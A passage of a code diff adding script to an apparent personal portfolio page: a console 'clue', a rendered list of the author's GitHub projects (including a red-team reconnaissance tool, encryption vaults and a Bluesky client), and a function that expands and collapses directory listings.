+    // 2. Log the clue to the console with styling
+    console.log(
+        "THE SITE: it's in the machine",
+                                              // Standard text
+    );
+});
+// ==========================================
+// PROJECT BRIEFS (Basic List)
+// ==========================================
+
+const projects = [
+    {
+        name: `<a href="https://github.com/nulsie/ColdStrain">ColdStrain</a>`,
+        details: "ColdStrain is an advanced, client-side JavaScript reconnaissance framework for red teaming.",
+        tech: "JS / CyberSec"
+    },
+    {
+        name: `<a href="https://github.com/nulsie/EtCAN">EtCAN</a>`,
+        details: "EtCAN is a decentralized, client-side, zero-knowledge, encrypted file transfer and steganography utility.",
+        tech: "JS / IPFS"
+    },
+    {
+        name: `<a href="https://github.com/nulsie/LycaClient">LycaClient</a>`,
+        details: "a lightweight, open-source web client for Bluesky designed to return control to the user.",
+        tech: "Vanilla Web / ATProto"
+    },
+    {
+        name: `<a href="https://github.com/nulsie/PIES">PIES</a>`,
+        details: "A local-first storage vault featuring AES-256 encryption and a 'Duress Passkey' for emergency data purging.",
+        tech: "CryptoJS / LocalStorage"
+    },
+    {
+        name: `<a href="https://github.com/nulsie/PIESImages">PIESImages</a>`, 
+        details: "The image storage version of the PIES app.",
+        tech: "CryptoJS / LocalStorage"
+    },
+    {
+        name: `<a href="https://github.com/nulsie/TISH">TISH</a>`, 
+        details: "A fully client-side, purely static threat intelligence dashboard.",
+        tech: "Vanilla Web"
+    },
+];
+
+const projectBriefUI = document.getElementById('project-brief-list');
+
+projects.forEach(p => {
+    const li = document.createElement('li');
+    li.style.marginBottom = "12px";
+    li.innerHTML = `<strong style="color: #A3BE8C;">${p.name}</strong> — ${p.details} <span style="color: #81A1C1; font-size: 12px;">(${p.tech})</span>`;
+    projectBriefUI.appendChild(li);
+});
+ // Add to your existing <script> section
+function toggleDir(dirId, element) {
+    const dir = document.getElementById(dirId);
+    if (dir.style.display === "none") {
+        dir.style.display = "inline"; // Inline keeps the pre formatting intact
+        element.innerText = element.innerText.replace('[+]', '[-]');
+    } else {
+        dir.style.display = "none";
+        element.innerText = element.innerText.replace('[-]', '[+]');
+    }
+}
+</script>
+</html>
